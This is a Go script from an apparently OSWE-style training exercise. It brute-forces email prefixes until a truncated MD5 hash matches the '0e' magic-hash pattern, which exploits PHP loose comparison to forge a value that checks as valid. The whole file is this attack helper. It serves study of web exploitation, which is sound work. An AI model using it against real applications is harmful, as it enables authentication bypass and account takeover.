package main

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"regexp"
	"strconv"
	"strings"

	"github.com/iPhantasmic/OSWE/scripts/utils"
	"github.com/mowshon/iterium"
)

// Ex 4.5.2.2 - Part 1: MD5 bruteforce

func genCode(domain, id, date string, prefixLength int) {
	product := iterium.Product(iterium.AsciiLowercase, prefixLength)

	// merge a slice into a string
	// []string{"a", "b", "c"} => "abc"
	join := func(product []string) string {
		return strings.Join(product, "")
	}

	prefixes := iterium.Map(product, join)

	for prefix := range prefixes.Chan() {
		email := fmt.Sprintf("%s@%s"+date+id, prefix, domain)

		hasher := md5.New()
		hasher.Write([]byte(email))

		substring := hex.EncodeToString(hasher.Sum(nil))[:10]

		// https://stackoverflow.com/questions/33780595/whats-wrong-with-the-golang-regexp-matchstring
		re := regexp.MustCompile(`^0+[eE]\d+$`)
		match := re.MatchString(substring)

		if match {
			utils.PrintSuccess("Found a valid email: " + email)
			utils.PrintInfo("Equivalent loose comparison: " + fmt.Sprintf("%s == 0", substring))
		}
	}
}

func main() {
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) != 5 {
		utils.PrintFailure(fmt.Sprintf("usage: %s <domain name> <id> <creation_date> <prefix length>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s offsec.local 3 \"2018-06-10 23:59:59\" 3", os.Args[0]))
		os.Exit(1)
	}

	domain := os.Args[1]
	id := os.Args[2]
	creationDate := os.Args[3]
	prefixLength, err := strconv.Atoi(os.Args[4])
	if err != nil {
		log.Fatalln("Invalid prefix length!")
	}

	genCode(domain, id, creationDate, prefixLength)
}
